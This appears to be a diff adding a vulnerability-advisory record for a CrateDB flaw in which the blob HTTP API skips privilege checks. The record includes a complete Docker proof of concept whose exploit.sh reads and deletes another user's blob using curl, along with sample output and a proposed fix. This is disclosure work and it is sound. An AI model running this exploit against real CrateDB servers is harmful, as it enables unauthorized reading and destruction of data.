@@ -1,0 +1,382 @@
+advisory_id: GHSA-2xv8-gjwh-fv8p
+datasource_id: github_osv/GHSA-2xv8-gjwh-fv8p
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-2xv8-gjwh-fv8p/GHSA-2xv8-gjwh-fv8p.json
+aliases:
+  - CVE-2026-49989
+summary: |
+  CrateDB's Blob HTTP handler bypasses authorization
+  **Component:** `io.crate.protocols.http.HttpBlobHandler`
+  **Affected:** verified against CrateDB 6.2.7 (latest at time of report; the bug has existed since the blob HTTP handler was introduced)
+  **Impact:** any authenticated user can read or delete any blob whose SHA-1 digest they know, and can plant new blobs unconditionally, in any blob table, regardless of `GRANT`s.
+
+  ---
+
+  ## Summary
+
+  CrateDB has two ways to access blob storage: SQL (`SELECT ... FROM blob.<table>` and friends) and the blob HTTP API (`GET|PUT|DELETE /_blobs/{table}/{digest}`). The SQL path goes through `AccessControl`, which is what enforces privilege grants; that's why `SELECT digest FROM blob.secret_blobs` fails for a user who has no grants on the table.
+
+  The HTTP path authenticates the request but never asks `AccessControl` whether the authenticated user is allowed to touch the table. So a user with no grants gets `MissingPrivilegeException` from SQL and `200 OK` plus the blob bytes from `GET /_blobs/secret_blobs/<digest>`.
+
+  ## Where it lives
+
+  `server/src/main/java/io/crate/protocols/http/HttpBlobHandler.java`. The dispatcher:
+
+  ```java
+  // HttpBlobHandler.java:176
+  private void handleBlobRequest(@Nullable HttpContent content) throws IOException {
+      if (possibleRedirect(index, digest)) {
+          return;
+      }
+
+      if (method.equals(HttpMethod.GET)) {
+          get(index, digest);
+          reset();
+      } else if (method.equals(HttpMethod.HEAD)) {
+          head(index, digest);
+      } else if (method.equals(HttpMethod.PUT)) {
+          put(content, index, digest);
+      } else if (method.equals(HttpMethod.DELETE)) {
+          delete(index, digest);
+      } else {
+          simpleResponse(HttpResponseStatus.METHOD_NOT_ALLOWED);
+      }
+  }
+  ```
+
+  No `AccessControl` reference, no privilege check. Each branch goes straight to the relevant blob op (`get`/`head`/`put`/`delete`); for example:
+
+  ```java
+  // HttpBlobHandler.java:287
+  private void get(String index, final String digest) throws IOException {
+      if (range != null) {
+          partialContentResponse(index, digest);
+      } else {
+          fullContentResponse(index, digest);
+      }
+  }
+  ```
+
+  `grep -n 'AccessControl\|ensureMaySee\|checkPermission' HttpBlobHandler.java` returns nothing.
+
+  The APIs that should be called here, used by the SQL path before every statement is dispatched:
+
+  - `server/src/main/java/io/crate/auth/AccessControl.java` (interface, declares `ensureMayExecute(...)` and `ensureMaySee(...)`)
+  - `server/src/main/java/io/crate/auth/AccessControlImpl.java:133` (concrete impl)
+
+  ## Threat model
+
+  Unconditional in code, gated in practice by digest knowledge; CrateDB has no enumeration channel. `HEAD /_blobs/<table>/<digest>` is the existence oracle; candidate digests may come from side channels such as app metadata, logs, known-file probes.
+
+  | Capability | Needs digest? | Impact |
+  |---|---|---|
+  | Read or delete a blob | yes | High when digests leak, nil otherwise |
+  | Plant new blobs (PUT) | no | Storage pollution; SHA-1 check blocks forging under a victim's digest |
+
+  Digest secrecy is not a documented security boundary.
+
+  ## Reproduction
+
+  End-to-end Docker PoC. Two users, one blob, both ingress paths exercised side by side.
+
+  `./run.sh` brings up a CrateDB container with HBA enabled, creates an `admin` (with `ALL PRIVILEGES`) and an `unprivileged` user (with no grants), uploads a blob as admin, then runs six steps:
+
+  1. Admin uploads a blob via `PUT /_blobs/...`. Success (201).
+  2. Admin reads via SQL. Success.
+  3. **Unprivileged user reads via SQL.** Denied (correct, this is what we want).
+  4. **Unprivileged user reads via `GET /_blobs/...`.** `200 OK` plus the blob payload (the bug).
+  5. **Unprivileged user deletes via `DELETE /_blobs/...`.** `204 No Content` (the bug, again).
+  6. Admin re-checks via SQL. Confirms the blob is gone, deleted by a user with zero grants.
+
+  Sample output from a real run:
+
+  ```
+  === Step 3: Unprivileged user CANNOT read via SQL (expected) ===
+  [PASS] Unprivileged user correctly denied SQL access
+  [INFO] Server response: ERROR:  Schema 'blob' unknown ...
+
+  === Step 4: BUG -- Unprivileged user CAN read blob via HTTP ===
+  [FAIL] Unprivileged user READ the blob via HTTP (HTTP 200) -- AUTHORIZATION BYPASS
+  [INFO] Retrieved content: TOP SECRET: this data should only be accessible to admin
+
+  === Step 5: BUG -- Unprivileged user CAN delete blob via HTTP DELETE ===
+  [FAIL] Unprivileged user DELETED the blob via HTTP (HTTP 204) -- AUTHORIZATION BYPASS
+  ```
+
+  ### PoC files
+
+  <details>
+  <summary><code>docker-compose.yml</code></summary>
+
+  ```yaml
+  services:
+    cratedb:
+      image: crate:6.2.7
+      ports:
+        - "4200:4200"
+        - "5432:5432"
+      command: >
+        crate
+        -Cnetwork.host=0.0.0.0
+        -Cdiscovery.type=single-node
+        -Cauth.host_based.enabled=true
+        -Cauth.host_based.config.0.user=crate
+        -Cauth.host_based.config.0.method=trust
+        -Cauth.host_based.config.99.method=password
+        -Cblobs.path=/data/blobs
+      environment:
+        - CRATE_HEAP_SIZE=512m
+      healthcheck:
+        test: ["CMD-SHELL", "curl -sf http://localhost:4200/ || exit 1"]
+        interval: 5s
+        timeout: 5s
+        retries: 12
+  ```
+
+  HBA rule 0 trusts the built-in `crate` superuser so `setup.sql` can bootstrap users; rule 99 forces password auth for everyone else. `network.host=0.0.0.0` overrides the default `_site_` bind, which fails when Docker's interfaces have no site-local address.
+
+  </details>
+
+  <details>
+  <summary><code>setup.sql</code></summary>
+
+  ```sql
+  -- Create the blob table
+  CREATE BLOB TABLE secret_blobs;
+
+  -- Create admin user with full access
+  CREATE USER admin WITH (password = 'adminpass');
+  GRANT ALL PRIVILEGES ON TABLE blob.secret_blobs TO admin;
+
+  -- Create unprivileged user with NO access to the blob table
+  CREATE USER unprivileged WITH (password = 'unpriv123');
+  -- Intentionally no GRANT for unprivileged user
+  ```
+
+  </details>
+
+  <details>
+  <summary><code>exploit.sh</code></summary>
+
+  ```bash
+  #!/usr/bin/env bash
+  set -euo pipefail
+
+  CRATE_HTTP="http://localhost:4200"
+  BLOB_TABLE="secret_blobs"
+  BLOB_CONTENT="TOP SECRET: this data should only be accessible to admin"
+
+  RED='\033[0;31m'
+  GREEN='\033[0;32m'
+  YELLOW='\033[1;33m'
+  CYAN='\033[0;36m'
+  NC='\033[0m'
+
+  header() { printf "\n${CYAN}=== %s ===${NC}\n" "$1"; }
+  pass()   { printf "${GREEN}[PASS]${NC} %s\n" "$1"; }
+  fail()   { printf "${RED}[FAIL]${NC} %s\n" "$1"; }
+  info()   { printf "${YELLOW}[INFO]${NC} %s\n" "$1"; }
+
+  sql_as() {
+      local user="$1" pass="$2" query="$3"
+      PGPASSWORD="$pass" psql -h localhost -p 5432 -U "$user" -d doc -tAc "$query" 2>&1
+  }
+
+  # ---------------------------------------------------------------------------
+  header "Step 1: Upload a blob as admin via HTTP"
+  # ---------------------------------------------------------------------------
+  DIGEST=$(echo -n "$BLOB_CONTENT" | sha1sum | awk '{print $1}')
+  info "Blob SHA1 digest: $DIGEST"
+
+  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
+      -u admin:adminpass \
+      -XPUT "${CRATE_HTTP}/_blobs/${BLOB_TABLE}/${DIGEST}" \
+      -d "$BLOB_CONTENT")
+
+  if [[ "$HTTP_CODE" == "201" || "$HTTP_CODE" == "409" ]]; then
+      pass "Admin uploaded blob via HTTP (HTTP $HTTP_CODE)"
+  else
+      fail "Admin blob upload returned HTTP $HTTP_CODE"
+      exit 1
+  fi
+
+  # ---------------------------------------------------------------------------
+  header "Step 2: Admin CAN read blob metadata via SQL (expected)"
+  # ---------------------------------------------------------------------------
+  RESULT=$(sql_as admin adminpass "SELECT digest FROM blob.secret_blobs LIMIT 1")
+  if [[ -n "$RESULT" ]]; then
+      pass "Admin can query blob.secret_blobs via SQL: digest=$RESULT"
+  else
+      fail "Admin SQL query returned no results"
+  fi
+
+  # ---------------------------------------------------------------------------
+  header "Step 3: Unprivileged user CANNOT read via SQL (expected)"
+  # ---------------------------------------------------------------------------
+  RESULT=$(sql_as unprivileged unpriv123 "SELECT digest FROM blob.secret_blobs LIMIT 1" || true)
+  if echo "$RESULT" | grep -qi "denied\|permission\|unauthorized\|not authorized"; then
+      pass "Unprivileged user correctly denied SQL access"
+      info "Server response: $(echo "$RESULT" | head -1)"
+  else
+      fail "Unprivileged user was NOT denied SQL access (unexpected): $RESULT"
+  fi
+
+  # ---------------------------------------------------------------------------
+  header "Step 4: BUG -- Unprivileged user CAN read blob via HTTP"
+  # ---------------------------------------------------------------------------
+  HTTP_CODE=$(curl -s -o /tmp/blob_out -w "%{http_code}" \
+      -u unprivileged:unpriv123 \
+      "${CRATE_HTTP}/_blobs/${BLOB_TABLE}/${DIGEST}")
+
+  BODY=$(cat /tmp/blob_out)
+
+  if [[ "$HTTP_CODE" == "200" ]]; then
+      fail "Unprivileged user READ the blob via HTTP (HTTP $HTTP_CODE) -- AUTHORIZATION BYPASS"
+      info "Retrieved content: ${BODY}"
+  else
+      pass "Unprivileged user was denied HTTP blob read (HTTP $HTTP_CODE)"
+  fi
+
+  # ---------------------------------------------------------------------------
+  header "Step 5: BUG -- Unprivileged user CAN delete blob via HTTP DELETE"
+  # ---------------------------------------------------------------------------
+  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
+      -u unprivileged:unpriv123 \
+      -XDELETE "${CRATE_HTTP}/_blobs/${BLOB_TABLE}/${DIGEST}")
+
+  if [[ "$HTTP_CODE" == "204" || "$HTTP_CODE" == "200" ]]; then
+      fail "Unprivileged user DELETED the blob via HTTP (HTTP $HTTP_CODE) -- AUTHORIZATION BYPASS"
+  else
+      pass "Unprivileged user was denied HTTP blob delete (HTTP $HTTP_CODE)"
+  fi
+
+  # ---------------------------------------------------------------------------
+  header "Step 6: Confirm blob is gone (admin perspective)"
+  # ---------------------------------------------------------------------------
+  RESULT=$(sql_as admin adminpass "SELECT count(*) FROM blob.secret_blobs WHERE digest = '$DIGEST'")
+  if [[ "$RESULT" == "0" ]]; then
+      fail "Blob confirmed deleted -- unprivileged user destroyed admin's data"
+  else
+      info "Blob still exists (count=$RESULT)"
+  fi
+  ```
+
+  </details>
+
+  <details>
+  <summary><code>run.sh</code></summary>
+
+  ```bash
+  #!/usr/bin/env bash
+  set -euo pipefail
+  cd "$(dirname "$0")"
+
+  RED='\033[0;31m'
+  GREEN='\033[0;32m'
+  YELLOW='\033[1;33m'
+  NC='\033[0m'
+
+  info() { printf "${YELLOW}[INFO]${NC} %s\n" "$1"; }
+
+  # Pick whichever Compose CLI is available (docker compose v2 vs legacy
+  # docker-compose binary). Both are common in the wild.
+  if docker compose version >/dev/null 2>&1; then
+      DC=(docker compose)
+  elif command -v docker-compose >/dev/null 2>&1; then
+      DC=(docker-compose)
+  else
+      echo "ERROR: neither 'docker compose' (v2) nor 'docker-compose' (v1) is installed." >&2
+      exit 2
+  fi
+
+  cleanup() {
+      info "Stopping containers..."
+      "${DC[@]}" down -v 2>/dev/null || true
+  }
+  trap cleanup EXIT
+
+  info "Starting CrateDB with authentication enabled..."
+  "${DC[@]}" up -d
+
+  info "Waiting for CrateDB to become healthy..."
+  for i in $(seq 1 60); do
+      if curl -sf http://localhost:4200/ > /dev/null 2>&1; then
+          break
+      fi
+      sleep 1
+  done
+
+  # Verify CrateDB is actually ready for SQL connections
+  for i in $(seq 1 30); do
+      if PGPASSWORD="" psql -h localhost -p 5432 -U crate -d doc -c "SELECT 1" > /dev/null 2>&1; then
+          break
+      fi
+      sleep 1
+  done
+
+  info "Running setup SQL as superuser (crate)..."
+  PGPASSWORD="" psql -h localhost -p 5432 -U crate -d doc -f setup.sql
+
+  # Give CrateDB a moment to propagate user/privilege changes
+  sleep 2
+
+  info "Running exploit..."
+  echo ""
+  bash exploit.sh
+  ```
+
+  </details>
+
+  ## Fixing
+
+  Plumb `AccessControl` into `HttpBlobHandler`. Before dispatching the verb at `handleBlobRequest:181`, resolve the connecting role from the channel attribute the auth filter already sets, build an `AccessControlImpl`, and call `ensureHasPrivilege(...)` for the verb. Failures produce `MissingPrivilegeException`, which the existing exception-to-HTTP mapping turns into `403 Forbidden`. SQL and HTTP then share one authorization decision.
+
+  | HTTP verb | SQL equivalent | Required privilege on `blob.<table>` |
+  |---|---|---|
+  | `GET` / `HEAD` | `SELECT` | `DQL` |
+  | `PUT` | `INSERT` / `UPDATE` | `DML` |
+  | `DELETE` | `DELETE` | `DML` |
+
+  Alternatives I'd avoid: pushing checks down into `BlobService` (every caller has to remember to pass a role) or wrapping the handler in a separate Netty filter (works but separates the check from the action it gates).
+
+  ## Notes
+
+  Deployments that don't use `BLOB TABLE` are unaffected. Authentication itself still works; the bug is strictly that being authenticated as anyone is treated as sufficient for any blob op.
+impacted_packages:
+  - purl: pkg:maven/io.crate/crate
+    affected_versions: vers:maven/<6.2.8
+    fixed_versions: vers:maven/6.2.8
+    affected_packages: []
+    fixed_packages:
+      - pkg:maven/io.crate/crate@6.2.8
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:maven/io.crate/crate
+    affected_versions: vers:maven/>=6.3.0|<6.3.2
+    fixed_versions: vers:maven/6.3.2
+    affected_packages:
+      - pkg:maven/io.crate/crate@6.3.0
+    fixed_packages:
+      - pkg:maven/io.crate/crate@6.3.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '0.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-2xv8-gjwh-fv8p/GHSA-2xv8-gjwh-fv8p.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-863
+references:
+  - url: https://github.com/crate/crate
+    reference_type:
+    reference_id:
+  - url: https://github.com/crate/crate/security/advisories/GHSA-2xv8-gjwh-fv8p
+    reference_type:
+    reference_id:
+exploits: []
